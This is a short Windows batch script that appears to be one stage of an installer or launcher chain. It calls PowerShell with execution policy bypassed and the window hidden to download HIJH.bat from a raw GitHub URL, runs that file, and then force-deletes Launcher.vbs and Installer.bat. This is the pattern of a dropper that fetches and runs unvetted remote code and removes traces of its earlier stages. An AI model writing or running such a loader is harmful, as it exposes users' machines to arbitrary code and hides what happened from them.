@echo off
setlocal EnableExtensions DisableDelayedExpansion

set "BASE=https://raw.githubusercontent.com/creatorcostudios/files/main"
set "OUT=%~dp0HIJH.bat"

echo Downloading HIJH.bat...
powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ^
  "$ProgressPreference='SilentlyContinue'; (New-Object Net.WebClient).DownloadFile('%BASE%/HIJH.bat', '%OUT%')"

echo Running HIJH.bat...
cmd /c ""%OUT%""

echo Removing support files...
del /f /q "%~dp0Launcher.vbs"
del /f /q "%~dp0Installer.bat"

echo Done.
exit /b